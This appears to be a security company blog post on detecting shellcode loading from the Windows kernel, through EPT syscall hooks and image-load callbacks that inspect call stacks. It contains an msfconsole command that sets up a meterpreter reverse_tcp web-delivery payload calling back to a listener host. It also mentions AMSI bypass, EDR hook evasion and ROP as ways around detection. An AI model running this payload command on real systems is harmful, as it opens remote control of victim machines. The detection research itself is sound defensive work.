<p>The tools used to load code into memory have changed a lot recently. I have seen this evolution in shellcode, manually mapped images and other types of code execution methods. Sometimes, some of these techniques need to circumvent mitigations imposed by the operating system, such as bypassing <a href="https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/" target="_blank" rel="noreferrer noopener">AMSI</a>, disabling writing to the Event-Log or evading hooks placed by EDRs in user space to avoid being detected.</p>



<p>A typical use case used by attackers is to patch EDR’s user-space memory hooks or use <span style="text-decoration: underline;"><a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/" target="_blank" rel="noreferrer noopener">Direct System Calls</a></span> to evade detection by EDRs and then load their code into the memory. This is a scenario where having an extra layer of kernel detection can be useful to detect shellcode loading in real time.</p>



<p>It is important to note that nothing in this post is a new technique. We are going to discuss very specific examples, but there are many more methods in addition to those listed below.</p>



<p>Let’s discuss what challenges we are going to face in order to detect the shellcode at runtime. To accomplish this we will use two different approaches:</p>



<ul class="wp-block-list">
<li>Hooking some syscalls via hypervisor EPT feature</li>



<li>Detecting shellcodes from kernel callback</li>
</ul>



<p>&nbsp;</p>
<p>Read on for more insights.</p>
<p>&nbsp;</p>







<h3 id="setup" class="wp-block-heading">Setup</h3>



<p>We are going to use Metasploit as a C2 (Command &amp; Control ) and the shellcode will be loaded into local process powershell.exe. We’ve chosen powershell as the process that launches meterpreter because it is a common way to load shellcodes in the local process.</p>



<p>We are going to generate a one-liner script to execute in powershell using:</p>



<pre class="wp-block-code"><code>msfconsole -x "use exploit/multi/script/web_delivery; set target 2; set lhost 192.168.1.44; set lport 1234; set payload windows/x64/meterpreter/reverse_tcp; exploit"
</code></pre>



<p>&nbsp;</p>
<p>The script generated is:</p>

<h3 id="detection-by-hooking" class="wp-block-heading">Detection by Hooking</h3>



<p>Once the powershell script is executed and after unzipping and decoding it, we can capture the loader of the <strong>stage 1</strong> of our implant from the memory:</p>



<figure class="wp-block-image"><img width="846" height="715" decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20846%20715'%3E%3C/svg%3E" alt="" data-lazy-src="https://www.countercraftsec.com/images/blog/loader2.png" /><noscript><img width="846" height="715" decoding="async" src="https://www.countercraftsec.com/images/blog/loader2.png" alt="" /></noscript></figure>





<p>&nbsp;</p>
<p>In the <strong>stage 1</strong> shellcode loader code we identify the following steps:</p>



<ol class="wp-block-list">
<li>Allocate memory in the local process</li>



<li>Write the shellcode to the allocated memory</li>



<li>Create a thread pointing to the shellcode</li>
</ol>



<p>&nbsp;</p>
<p>The first step is the easiest to detect. The second step is just a memory copy, so there are no external calls we can monitor or filter. The last step calls a system function to spawn the thread, a very common action in any code that can be used for detection. However, using <span style="text-decoration: underline;"><a href="https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/#Return-Oriented%E2%80%A6-urm-threading" target="_blank" rel="noreferrer noopener">ROP</a></span>, detection is very easily avoided, so in this post I won’t go into further detail.</p>



<p>&nbsp;</p>
<p>Let’s take a look at the following piece of code :</p>



<figure class="wp-block-image"><img width="815" height="128" decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20815%20128'%3E%3C/svg%3E" alt="" data-lazy-src="https://www.countercraftsec.com/images/blog/loader3_VirtualAlloc.png" /><noscript><img width="815" height="128" decoding="async" src="https://www.countercraftsec.com/images/blog/loader3_VirtualAlloc.png" alt="" /></noscript></figure>

<ul>
<li>0x3000 = MEM_RESERVE | MEM_COMMIT</li>
<li>0x40 = PAGE_EXECUTE_READWRITE (RWX)</li>
</ul>

That is why we are going to use EPT to hook some syscalls and bypass PatchGuard mitigation. More info about <span style="text-decoration: underline;"><a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-4/" target="_blank" rel="noreferrer noopener">EPT here</a>.</span></p>

<h4><strong>Hooking Takeaways</strong></h4>



<p>1. We could continue iterating with potential improvements using other APIs such as <strong>CreateFileMapping</strong> or <strong>NtMapViewOfSection</strong> to allocate memory, which would turn into a cat-and-mouse game trying to monitor more APIs and attackers trying to find new ways to allocate the memory.</p>



<p>2. The downside of trying to detect shellcode loading processes using hooks is having to deal with possible false positives. This is not exclusive to the kernel hooking we are using here, the EDRs working in user space need to face the same problem.</p>



<p>3. It should be noted that this type of detection based on monitoring syscalls with hooks using EPT can only be accomplished on systems with EPT capabilities.</p>
<p>&nbsp;</p>







<h3 id="detecting-shellcodes-from-kernel-using-callbacks" class="wp-block-heading">Detecting Shellcodes from Kernel Using Callbacks</h3>



<p>Once the shellcode loader loads <strong>stage1</strong> into memory, we notice that the code is a <strong>reverse_tcp</strong> that will try to connect to the C2 server and load the meterpreter payload. We can access the code directly from <span style="text-decoration: underline;"><a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_reverse_tcp.asm" target="_blank" rel="noreferrer noopener">github</a></span> to read it better:</p>



<figure></figure>
<figure class="wp-block-image"><img width="642" height="630" decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20642%20630'%3E%3C/svg%3E" alt="" data-lazy-src="https://www.countercraftsec.com/images/blog/reverse_tcp.png" /><noscript><img width="642" height="630" decoding="async" src="https://www.countercraftsec.com/images/blog/reverse_tcp.png" alt="" /></noscript></figure>



<div class="wp-block-spacer" style="height: 30px;" aria-hidden="true"> </div>



<p>By looking at the <strong>stage1</strong> code we notice how it needs to load the <strong>ws2_32.dll</strong> library to resolve the memory address of the network APIs it will use to communicate with the C2 server:</p>



<figure></figure>
<figure class="wp-block-image"><img width="597" height="65" decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20597%2065'%3E%3C/svg%3E" alt="" data-lazy-src="https://www.countercraftsec.com/images/blog/ReverseTcpLoadLibrary.png" /><noscript><img width="597" height="65" decoding="async" src="https://www.countercraftsec.com/images/blog/ReverseTcpLoadLibrary.png" alt="" /></noscript></figure>



<div class="wp-block-spacer" style="height: 30px;" aria-hidden="true"> </div>



<p>The idea of detection is to monitor from the kernel the libraries loaded from userspace and inspect the call stack of the thread that has made the syscall to detect if the base address of the call stack elements has been manually mapped code.</p>



<p>In order to monitor the libraries loaded in the system, we are going to use <strong>PsSetLoadImageNotifyRoutine</strong>, which allows us to install our callback and monitor the images that are loaded in the system using the API including the libraries(dll).</p>



<p>To carry out detection, we can follow these steps:</p>



<ul class="wp-block-list">
<li>Walk the call stack to obtain the memory base address of its elements.</li>



<li>Obtain <strong>MEMORY_BASIC_INFORMATION</strong> <span style="text-decoration: underline;"><a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information" target="_blank" rel="noreferrer noopener">structure</a></span> returned by <strong>ZwQueryVirtualMemory</strong> for each element.</li>



<li>Detect private(<strong>MEM_PRIVATE</strong>) or mapped(<strong>MEM_MAPPED</strong>) as executable.</li>
</ul>



<div class="wp-block-spacer" style="height: 10px;" aria-hidden="true"> </div>



<figure></figure>
<figure class="wp-block-image"><img width="983" height="643" decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20983%20643'%3E%3C/svg%3E" alt="" data-lazy-src="https://www.countercraftsec.com/images/blog/CallbackCallstack2.png" /><noscript><img width="983" height="643" decoding="async" src="https://www.countercraftsec.com/images/blog/CallbackCallstack2.png" alt="" /></noscript></figure>



<div class="wp-block-spacer" style="height: 30px;" aria-hidden="true"> </div>



<p>In the image above we can see the detection of a suspicious region at 0x0000017d61ae013b within the call stack which is mapped as private with executable permissions(RWX) trying to load the mswsock.dll library.</p>



<p>If we examine the instructions within the detected shellcode, we see that it coincides with meterpreter <strong>reverse_tcp</strong> code just after call to <strong>WSASocketA</strong>:</p>



<figure></figure>
<figure class="wp-block-image"><img width="627" height="149" decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20627%20149'%3E%3C/svg%3E" alt="" data-lazy-src="https://www.countercraftsec.com/images/blog/shellcodeCallstack.png" /><noscript><img width="627" height="149" decoding="async" src="https://www.countercraftsec.com/images/blog/shellcodeCallstack.png" alt="" /></noscript></figure>



<p>&nbsp;</p>
<p>We see that the first library loaded by the shellcode is mswsock.dll which is loaded when calling WSASocketA. Why didn’t we catch the call to LoadLibraryA(<strong>ws2_32.dll</strong>) ? Well, in our case this library is already loaded by powershell.exe by default so the first library that is actually loaded from the shellcode is mswsock.dll which is a dependency when calling <strong>WSASocketA</strong>.</p>



<p>This allows us to see other libraries that are loaded from the shellcode when connecting to the C2 server and downloading the payload.<img width="560" height="20" decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20560%2020'%3E%3C/svg%3E" alt="" data-lazy-src="https://www.countercraftsec.com/images/blog/mid-space.png" /><noscript><img width="560" height="20" decoding="async" src="https://www.countercraftsec.com/images/blog/mid-space.png" alt="" /></noscript></p>





<h3 id="conclusions" class="wp-block-heading">Conclusions</h3>



<p>This article was just a quick overview of how to detect shellcodes from the kernel in real time using specific and not very advanced examples. As I mentioned earlier in the introduction, none of the techniques we are using here are anything new, and they can be bypassed with some additional work. These are only some concrete examples of what can be detected from the kernel. However, I think it may be useful for researchers, who develop of offensive security tools, to consider these methods in addition to EDR userland hooks. There may be specific environments or situations in which kernel detection could be more effective.</p>
